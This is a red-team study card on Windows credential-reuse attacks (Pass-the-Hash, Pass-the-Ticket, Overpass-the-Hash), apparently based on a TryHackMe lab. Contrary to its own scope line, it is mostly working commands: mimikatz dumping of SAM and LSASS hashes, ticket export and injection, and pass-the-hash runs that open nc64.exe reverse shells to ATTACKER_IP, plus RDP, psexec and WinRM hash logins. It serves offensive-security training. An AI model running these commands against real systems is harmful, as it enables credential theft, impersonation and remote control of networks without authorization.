---
{"dg-publish":true,"permalink":"/cards/red-team/use-of-alternate-authentication-material/"}
---

~ [[cards/red-team/lateral movement and pivoting\|lateral movement and pivoting]]
## Summary
---
**What it is:** Technique for abusing non-password authentication material (hashes, Kerberos tickets, and encryption keys) to authenticate as another user without knowing their plaintext password.  

**Scope:** Covers Pass-the-Hash, Pass-the-Ticket, and Overpass-the-Hash/Pass-the-Key at a conceptual level; excludes cracking, exploit code, and tooling syntax.  

**Key Topics:** NTLM authentication, Kerberos tickets, credential material, LSASS memory, lateral movement, token injection, TGT/TGS handling
## How it works
---
Windows authentication supports multiple credential forms—NTLM hashes, Kerberos tickets, and encryption keys—that can validate a user without requiring their plaintext password. When an operator obtains this material from the local SAM, cached credentials, or LSASS memory, they can inject it into a new process or session so that Windows treats them as the impersonated user. Administrators normally use these mechanisms indirectly through single sign-on, but adversaries can exploit them directly for stealthy lateral movement and access escalation.
## Steps
---
Any piece of data that you can use to access a Windows account without actually knowing a user's password itself:

- [[cards/active-directory/New Technology LAN Manager (NTLM)\|New Technology LAN Manager (NTLM)]] Authentication
- [[Kerberos \|Kerberos ]]Authentication

**Attacker objective:** Authenticate as `{USER}` on `{TARGET}` using extracted authentication material instead of a password.

**Conceptual workflow:**

1. Gain administrative or SYSTEM-level access on a host to extract credential artifacts (hashes, tickets, or keys).
    
2. Identify the type of material available: NTLM hash (PtH), Kerberos ticket (PtT), or Kerberos encryption key (PtK/OPtH).
    
3. Create a new process or session that injects the extracted material so outbound authentication appears to originate from the victim user.
    
4. Use the resulting authenticated session to access remote services on `{TARGET}` or request additional Kerberos service tickets.
    
5. Maintain operational security by validating token context and minimizing artifacts or process traces.

### Pass-the-Hash
---
As a result of extracting credentials from a host where we have attained administrative privileges, we might get clear-text passwords or hashes that can be easily cracked.

Even if we can't crack the hash, **the NTLM challenge sent during authentication can be responded to just by knowing the password hash**. This of course assumes that the Windows domain is configured to use NTLM authentication.

To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.

**Extracting NTLM hashes from local SAM:**

This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

```C
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

A local admin hash still allows:

- Executing mimikatz
- SMB access to that machine
- RDP to the machine
- Dumping cached domain credentials (if any exist)
- Extracting Kerberos tickets
- LSASS tampering
- Persistence

**Extracting NTLM hashes from LSASS memory:**

This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

```C
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

Then we can use the extracted hash to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell or any other command we like: 

```C
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

> [!NOTE]- whoami
> Running `whoami` will show the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH

Notice `token::revert` is used (we currently use an administrative account) to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.

This would be the equivalent of using `runas /netonly` but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

![lateral movement and pivoting - 14.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2014.png)

**Passing the Hash Using Linux:**

_Connect to RDP using PtH:_

```shell-session
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

_Connect via psexec using PtH:_

```shell-session
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

**Note:** Only the linux version of psexec support PtH.

_Connect to WinRM using PtH:_

```shell-session
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

### Pass-the-Ticket
---
It is an attack where you take a Kerberos ticket (TGT or TGS) that you extracted and **inject it into your own current Windows session** so Windows thinks _you_ are the user the ticket belongs to.

Sometimes it will be possible to extract Kerberos tickets and session keys (**both are important**) from LSASS memory using `mimikatz`. The process usually requires us to have `SYSTEM` privileges on the attacked machine and can be done as follows:

> [!question]- my account SYSTEM?
> To know if you have `SYSTEM` privileges:
> 
> ```C
> whoami /priv
> ```
> 
> Output:
> 
> ![lateral movement and pivoting - 14-1.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2014-1.png)
> 
> If most of these is enabled then you have most likely equivalent to `SYSTEM` account.


```C
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Output:

```C
* Ticket exported to file '[0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi'
```

While mimikatz both TGTs and TGS can be extracted, you'll be interested in TGTs as they can be used to request access to any services the user is allowed to access:

- **TGTs** requires administrator's credentials.
- **TGSs** can be done with a low privileged account but only TGSs but they can **extract only tickets that exist in their own logon session in LSASS**.

Once you have extracted the desired ticket, we can inject the tickets into the current session with the following command:

```C
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

(Find the ticket that you want)

So if you inject the Administrator’s TGT into _your_ session: **Every tool you use will automatically authenticate as the Administrator** and to check if tickets were correctly injected:

```C
za\bob.jenkins@THMJMP2 C:\> klist
```

```C
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

Output:

![lateral movement and pivoting - 16.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting%20-%2016.png)
### Overpass-the-hash / Pass-the-key
---
This attack is similar to [[cards/red-team/lateral movement and pivoting#Pass-the-Hash\|Pass-the-Hash]] but applied to [[cards/active-directory/Kerberos\|Kerberos]] netowrks.

When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key depends on the installed Windows version and Kerberos configuration. If you have any of those keys, you can ask the [[Key Distribution Center\|Key Distribution Center]] for a TGT without requiring an actual password.

Obtain Kerberos encryption keys from memory by using mimikatz:

```C
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run a reverse shell on mimikatz via Pass-the-Key:

**if we have the RC4 hash:**

```C
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

The key is equal to NTLM hash of the user. This means if we could extract the NTLM hash, you can use it to request a TGT as long as RC4 is one of the enabled protocols. This attack is known as **Overpass-the-Hash**,

**If we have the AES128 hash:**

```C
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES256 hash:**

```C
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
